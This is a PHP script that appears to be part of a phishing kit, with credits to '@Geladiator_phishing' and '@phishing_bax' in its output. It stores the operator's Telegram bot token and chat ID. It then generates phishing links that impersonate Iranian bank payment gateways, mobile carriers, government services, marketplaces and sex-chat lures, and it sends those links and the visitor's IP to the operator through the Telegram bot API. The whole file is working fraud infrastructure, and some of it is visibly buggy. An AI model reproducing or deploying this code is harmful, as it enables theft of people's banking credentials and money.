<?php
include"INFO.php";
//ANTY SPAME
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

$Code=$_POST["code"];
$cheack = file_get_contents("captcha/code.txt");
 if ($Code==$cheack){
$T=file_get_contents("captcha/token.txt");
$IDS2=file_get_contents("captcha/id.txt");





file_put_contents("ID.txt",$IDS2);
 
$IP=$_SERVER["REMOTE_ADDR"];
$Domain=$_SERVER["HTTP_HOST"];
$O=rand(1000,9000);
if(!file_exists("data")){mkdir("data");}
$xkiler = fopen("data/$O.php", 'w') or die("Kos Nanat!");
fwrite($xkiler, "<?php\n");
fwrite($xkiler, "$");
fwrite($xkiler, "TOKEN='$T';\n");
fwrite($xkiler, "$");
fwrite($xkiler, "ID= $IDS2;\n");
fwrite($xkiler, "?>");


$Asan="$url/Asan/?e=$O";
$Live="$url/Live/?e=$O";
$Sighe="$url/Sighe/?e=$O";
$Irancell="$url/Irancell/?e=$O";
$Dostyabi="$url/Dostyabi/?e=$O";
$Masaj="$url/Masaj/?e=$O"; 
$Mobo="$url/Mobo/?e=$O";
$Charge="$url/Charge/?e=$O" ;
$Vam="$url/Vam/?e=$O";
$Mci="$url/Mci/?e=$O" ;
$Chat="$url/Chat/?e=$O";
$net6="$url/Net/?e=$O";
$Internet="$url/Internet/?e=$O" ;
$Hamta="$url/Hamta/?e=$O" ;
$Kheyrieh="$url/Kheyrieh/?e=$O" ;
$Internetmeli="$url/Internetmeli/?e=$O" ;
$Saham="$url/Saham/?e=$O" ;
$Freefolower="$url/Freefolower/?e=$O";
$Mellat= "$url/Mellat/?e=$O" ;
$Folower="$url/Folower/?e=$O";
$Filimo="$url/Filimo/?e=$O";
$Divar="$url/Divar/?e=$O" ;
$sheypoor="$url/sheypoor/?e=$O" ;
$book="$url/book/?e=$O" ;


        $Text="
        
        ╔═ [𝚈𝚘𝚞𝚛 𝚕𝚒𝚗𝚔𝚜!] ════╣⫸
╟ ✳️ Name :  Asan (آسان پرداخت) 
║ $Asan
╠═══════════════╣⫸
╟ ✳️ Name : Mellat (به پرداخت)
║ $Mellat
╠═══════════════╣⫸
╟ ✳️ Name :Charge(شارژ جدید)
║ $Charge
╠═══════════════╣⫸
╟ ✳️ Name : Net ( نت )
║ $net6
╠═══════════════╣⫸
╟ ✳️ Name : Vam (وام یک ملیونی)
║ $Vam
╠═══════════════╣⫸
╟ ✳️ Name : Mci (ام سی ای)
║ $Mci
╠═══════════════╣⫸
╟ ✳️ Name : Sex Chat(سکس چت)
║ $Chat
╠═══════════════╣⫸
╟ ✳️ Name : Live sexi (لایو سکسی)
║ $Live
╠═══════════════╣⫸
╟ ✳️ Name : Sighe (صیغه)
║ $Sighe
╠═══════════════╣⫸
╟ ✳️ Name : Iranccel (نت ایرانسل)
║ $Irancell
╠═══════════════╣⫸
╟ ✳️ Name : Netnew (نت جدید ) 
║ $Internet
╠═══════════════╣⫸
╟ ✳️ Name : Mobo (موبوشارژ) 
║ $Mobo
╠═══════════════╣⫸
╟ ✳️ Name : Help (کمک به بیماران) 
║ $Kheyrieh
╠═══════════════╣⫸
╟ ✳️ Name : Hamta (سامانه همتا) 
║ $Hamta
╠═══════════════╣⫸
╟ ✳️ Name : Netmeli (اینترنت ملی) 
║ $Internetmeli
╠═══════════════╣⫸
╟ ✳️ Name : Saham (سهام عدالت) 
║ $Saham
╠═══════════════╣⫸
╟ ✳️ Name : Folower ( خرید فالور) 
║ $Folower
╠═══════════════╣⫸
╟ ✳️ Name : Folower ( خرید اشتراک فیلمو) 
║ $Filimo
╠═══════════════╣⫸
╟ ✳️ Name : Divar  ( دیوار ) 
║ $Divar
╠═══════════════╣⫸
╟ ✳️ Name : Insta (فیک پیچ ) 
║ $Freefolower
╠═══════════════╣⫸
╟ ✳️ Name : Masaj (رزو ماساژور)
║ $Masaj
║
╠═══════════════╣⫸
╟ ✳️ Name : sheypoor (شیپور)
║ $sheypoor
║
╠═══════════════╣⫸
╟ ✳️ Name : book (کتاب)
║ $book
║
╠[𝚈𝚘𝚞𝚛 𝙸𝙿]╣⫸
╟ 🌐𝙸𝙿 <code>$IP</code>
╠═══[𝙻𝚒𝚗𝚔]══╣⫸
╟ ♻️ WEB LINK
║ $url
╠══[𝙿𝚘𝚛𝚝]═══╣⫸
╟ 🔢YOR  CODE <code>$O</code>
║ 
╠════════[𝙲𝚛𝚎𝚊𝚝𝚘𝚛] ════╣⫸
╟ ✨Cʀᴇᴀᴛᴇᴅ Bʏ : @Geladiator_phishing
║                @phishing_bax
║ 
╠═══[𝙲𝚑𝚊𝚗𝚗𝚎𝚕𝚝𝚎𝚕]═══════╣⫸
╟ 🆔 @Geladiator_phishing
║     @phishing_bax
║ 
╚══════  [𝙶𝚘𝚘𝚍 𝚕𝚞𝚌𝚔!] ════╣⫸
";
        

        $report =  file_get_contents("https://api.telegram.org/bot".$T."/SendMessage?chat_id=".$IDS2."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($Text));

$chat= file_get_contents("ID.txt");
$yo="your chat id: " ;
$getme12 = json_decode('https://api.telegram.org/bot'.$T.'/getMe');
file_get_contents($getme12) ;
$botusername = "https://t.me/".$getme12->result->username;
header("location: $botusername");
}else{
	header("Location: $url");
};
	?>